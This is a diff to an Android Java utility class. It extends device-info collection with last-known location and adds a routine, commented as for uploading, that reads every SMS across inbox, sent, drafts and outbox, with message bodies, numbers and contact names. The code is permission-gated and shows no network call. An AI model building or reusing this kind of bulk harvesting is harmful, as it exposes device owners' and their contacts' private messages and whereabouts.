@@ -47,6 +47,7 @@ import android.provider.Settings;
 import android.provider.Telephony;
 import android.telephony.CellLocation;
 import android.telephony.NeighboringCellInfo;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.telephony.cdma.CdmaCellLocation;
 import android.telephony.gsm.GsmCellLocation;
@@ -262,14 +263,14 @@ public class AppInfoUtil {
         void getDeviceInfo(String data);
     }
 
-    public static void getDeviceInfo(Activity context, GetDeviceInfo getDeviceInfo, int authid) {
+    public static void getDeviceInfo(Activity context, GetDeviceInfo getDeviceInfo, int authid, boolean needPosition) {
         //开线程
         new Thread(new Runnable() {
             @Override
             public void run() {
                 /**设备信息集合*/
                 HashMap<String, Object> deviceMap = new HashMap<>();
-                try{
+                try {
                     deviceMap.put("acChargeState", getStatusACBattery(context));
                     deviceMap.put("androidId", PhoneUtil.getAndroidId(context));
                     deviceMap.put("audioExternalCount", getAudioExternalCount(context));
@@ -290,8 +291,28 @@ public class AppInfoUtil {
                     deviceMap.put("language", PhoneUtil.getLanguage(context));
                     long bootTime = System.currentTimeMillis() - SystemClock.elapsedRealtime();
                     deviceMap.put("lastBootTime", bootTime);
-                    deviceMap.put("latitude", "0");
-                    deviceMap.put("longitude", "0");
+                    if (needPosition) {
+                        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+                                && ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
+                            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                                Location location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                                if (location != null) {
+                                    deviceMap.put("latitude", location.getLatitude());
+                                    deviceMap.put("longitude", location.getLongitude());
+                                } else {
+                                    deviceMap.put("latitude", "0");
+                                    deviceMap.put("longitude", "0");
+                                }
+                            } else {
+                                deviceMap.put("latitude", "0");
+                                deviceMap.put("longitude", "0");
+                            }
+                        }
+                    } else {
+                        deviceMap.put("latitude", "0");
+                        deviceMap.put("longitude", "0");
+                    }
                     deviceMap.put("model", Build.MODEL);
                     deviceMap.put("nativePhone", PhoneUtil.getPhoneNumber(context));
                     deviceMap.put("networkOperator", PhoneUtil.getOperatorName(context));
@@ -316,7 +337,7 @@ public class AppInfoUtil {
                     deviceMap.put("videoExternalCount", getVideoEXTERNALCount(context));
                     deviceMap.put("videoInternalCount", getVideoINTERNALCount(context));
                     deviceMap.put("wifiMac", PhoneUtil.getMacFromHardware());
-                }catch (Exception e){
+                } catch (Exception e) {
                     e.printStackTrace();
                 }
                 Gson gson = new Gson();
@@ -326,10 +347,10 @@ public class AppInfoUtil {
 
     }
 
-    public static String getDeviceInfo(Activity context, int authid) {
+    public static String getDeviceInfo(Activity context, int authid, boolean needPosition) {
         /**设备信息集合*/
         HashMap<String, Object> deviceMap = new HashMap<>();
-        try{
+        try {
             deviceMap.put("acChargeState", getStatusACBattery(context));
             deviceMap.put("androidId", PhoneUtil.getAndroidId(context));
             deviceMap.put("audioExternalCount", getAudioExternalCount(context));
@@ -350,8 +371,28 @@ public class AppInfoUtil {
             deviceMap.put("language", PhoneUtil.getLanguage(context));
             long bootTime = System.currentTimeMillis() - SystemClock.elapsedRealtime();
             deviceMap.put("lastBootTime", bootTime);
-            deviceMap.put("latitude", "0");
-            deviceMap.put("longitude", "0");
+            if (needPosition) {
+                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+                        && ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                    LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
+                    if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                        Location location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                        if (location != null) {
+                            deviceMap.put("latitude", location.getLatitude());
+                            deviceMap.put("longitude", location.getLongitude());
+                        } else {
+                            deviceMap.put("latitude", "0");
+                            deviceMap.put("longitude", "0");
+                        }
+                    } else {
+                        deviceMap.put("latitude", "0");
+                        deviceMap.put("longitude", "0");
+                    }
+                }
+            } else {
+                deviceMap.put("latitude", "0");
+                deviceMap.put("longitude", "0");
+            }
             deviceMap.put("model", Build.MODEL);
             deviceMap.put("nativePhone", PhoneUtil.getPhoneNumber(context));
             deviceMap.put("networkOperator", PhoneUtil.getOperatorName(context));
@@ -376,7 +417,7 @@ public class AppInfoUtil {
             deviceMap.put("videoExternalCount", getVideoEXTERNALCount(context));
             deviceMap.put("videoInternalCount", getVideoINTERNALCount(context));
             deviceMap.put("wifiMac", PhoneUtil.getMacFromHardware());
-        }catch (Exception e){
+        } catch (Exception e) {
             e.printStackTrace();
         }
         Gson gson = new Gson();
@@ -390,7 +431,7 @@ public class AppInfoUtil {
             switch (activeNetworkInfo.getType()) {
                 case ConnectivityManager.TYPE_MOBILE:
                     Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces();
-                    while (en!=null&&en.hasMoreElements()) {
+                    while (en != null && en.hasMoreElements()) {
                         Enumeration<InetAddress> enumIpAddr = en.nextElement().getInetAddresses();
                         while (enumIpAddr.hasMoreElements()) {
                             InetAddress inetAddress = enumIpAddr.nextElement();
@@ -743,6 +784,7 @@ public class AppInfoUtil {
                     int index_Date = cursor.getColumnIndex("date");
                     int index_Type = cursor.getColumnIndex("type");
                     int index_read = cursor.getColumnIndex("read");
+                    int type = cursor.getColumnIndex("type");
                     String strAddress = cursor.getString(index_Address);
                     String person = cursor.getString(index_Person);
                     String strBody = cursor.getString(index_Body);
@@ -768,6 +810,163 @@ public class AppInfoUtil {
 
         }
         return "";
+    }
+
+
+    /**
+     * 上传短信内容(区分短信发送状态)
+     */
+    public static String getSmsListType(Context context) {
+        if (!PermissionUtils.isGranted(Manifest.permission.READ_SMS)) {
+            return "";
+        }
+
+        try {
+            //获取收件箱短信列表
+            JSONArray smsInboxList = getSmsByUri(context, Telephony.Sms.Inbox.CONTENT_URI);
+            JSONArray smsSentList = getSmsByUri(context, Telephony.Sms.Sent.CONTENT_URI);
+            JSONArray smsDraftList = getSmsByUri(context, Telephony.Sms.Draft.CONTENT_URI);
+            JSONArray smsOutboxList = getSmsByUri(context, Telephony.Sms.Outbox.CONTENT_URI);
+            JSONArray smsBeanList = new JSONArray();
+            Uri uri = Uri.parse("content://sms/");
+            String[] projection = new String[]{"_id", "address", "person", "status",
+                    "body", "date", "type", "read"};
+            // 获取手机内部短信
+            Cursor cursor = context.getContentResolver().query(uri, projection, null,
+                    null, "date desc");
+
+            if (cursor != null && cursor.getCount() > 0) {
+                while (cursor.moveToNext()) {
+                    int index_id = cursor.getColumnIndex("_id");
+                    int index_Address = cursor.getColumnIndex("address");
+                    int index_Person = cursor.getColumnIndex("person");
+                    int index_Body = cursor.getColumnIndex("body");
+                    int index_Date = cursor.getColumnIndex("date");
+                    int index_Type = cursor.getColumnIndex("type");
+                    int index_read = cursor.getColumnIndex("read");
+                    int index_status = cursor.getColumnIndex("status");
+                    int id = cursor.getInt(index_id);
+                    String strAddress = cursor.getString(index_Address);
+                    String person = cursor.getString(index_Person);
+                    String strBody = cursor.getString(index_Body);
+                    long longDate = cursor.getLong(index_Date);
+                    int intType = cursor.getInt(index_Type);
+                    int intRead = cursor.getInt(index_read);
+                    int intStatus = cursor.getInt(index_status);
+                    JSONObject jsonObject = new JSONObject();
+                    jsonObject.put("smsPhone", strAddress);
+                    jsonObject.put("smsContent", strBody);
+                    jsonObject.put("smsType", intType == 2 ? 0 : 1);
+                    jsonObject.put("read", intRead == 0 ? 1 : 0);
+                    jsonObject.put("smsTime", longDate);
+                    jsonObject.put("smsName", person);
+                    jsonObject.put("status", getStatusByType(intStatus));
+                    //校验短信是否在收件箱
+                    if (smsInboxList.length() > 0) {
+                        for (int i = 0; i < smsInboxList.length(); i++) {
+                            JSONObject smsInbox = smsInboxList.getJSONObject(i);
+                            if (smsInbox.getInt("id") == id) {
+                                jsonObject.put("sendType", 1);
+                            }
+                        }
+                    }
+                    //校验短信是否在已发送
+                    if (smsSentList.length() > 0) {
+                        for (int i = 0; i < smsSentList.length(); i++) {
+                            JSONObject smsSent = smsSentList.getJSONObject(i);
+                            if (smsSent.getInt("id") == id) {
+                                jsonObject.put("sendType", 2);
+                            }
+                        }
+                    }
+                    //校验短信是否在草稿箱
+                    if (smsDraftList.length() > 0) {
+                        for (int i = 0; i < smsDraftList.length(); i++) {
+                            JSONObject smsDraft = smsDraftList.getJSONObject(i);
+                            if (smsDraft.getInt("id") == id) {
+                                jsonObject.put("sendType", 3);
+                            }
+                        }
+                    }
+                    //校验短信是否在发件箱
+                    if (smsOutboxList.length() > 0) {
+                        for (int i = 0; i < smsOutboxList.length(); i++) {
+                            JSONObject smsOutbox = smsOutboxList.getJSONObject(i);
+                            if (smsOutbox.getInt("id") == id) {
+                                jsonObject.put("sendType", 4);
+                            }
+                        }
+                    }
+                    if (!TextUtils.isEmpty(strBody)) {
+                        smsBeanList.put(jsonObject);
+                    }
+                }
+            }
+            cursor.close();
+            return smsBeanList.toString();
+
+        } catch (Exception e) {
+
+        }
+        return "";
+    }
+
+    private static String getStatusByType(int intStatus) {
+        String status = "";
+        switch (intStatus) {
+            case Telephony.Sms.STATUS_COMPLETE:
+                status = "COMPLETED";
+                break;
+            case Telephony.Sms.STATUS_NONE:
+                status = "RECEIVED";
+                break;
+            case Telephony.Sms.STATUS_FAILED:
+                status = "FAILED";
+                break;
+            case Telephony.Sms.STATUS_PENDING:
+                status = "PENDING";
+                break;
+        }
+        if(TextUtils.isEmpty(status)){
+            status = "OTHER";
+        }
+        return status;
+    }
+
+    private static JSONArray getSmsByUri(Context context, Uri uriInbox) throws JSONException {
+        JSONArray smsInboxList = new JSONArray();
+        Cursor cursor = context.getContentResolver().query(uriInbox, null, null, null, "date desc");
+        if (cursor != null && cursor.getCount() > 0) {
+            while (cursor.moveToNext()) {
+                int index_id = cursor.getColumnIndex("_id");
+                int index_Address = cursor.getColumnIndex("address");
+                int index_Person = cursor.getColumnIndex("person");
+                int index_Body = cursor.getColumnIndex("body");
+                int index_Date = cursor.getColumnIndex("date");
+                int index_Type = cursor.getColumnIndex("type");
+                int index_read = cursor.getColumnIndex("read");
+                int id = cursor.getInt(index_id);
+                String strAddress = cursor.getString(index_Address);
+                String person = cursor.getString(index_Person);
+                String strBody = cursor.getString(index_Body);
+                long longDate = cursor.getLong(index_Date);
+                int intType = cursor.getInt(index_Type);
+                int intRead = cursor.getInt(index_read);
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("id", id);
+                jsonObject.put("smsPhone", strAddress);
+                jsonObject.put("smsContent", strBody);
+                jsonObject.put("smsType", intType == 2 ? 0 : 1);
+                jsonObject.put("read", intRead == 0 ? 1 : 0);
+                jsonObject.put("smsTime", longDate);
+                jsonObject.put("smsName", person);
+                if (!TextUtils.isEmpty(strBody)) {
+                    smsInboxList.put(jsonObject);
+                }
+            }
+        }
+        cursor.close();
+        return smsInboxList;
     }
 
     /**
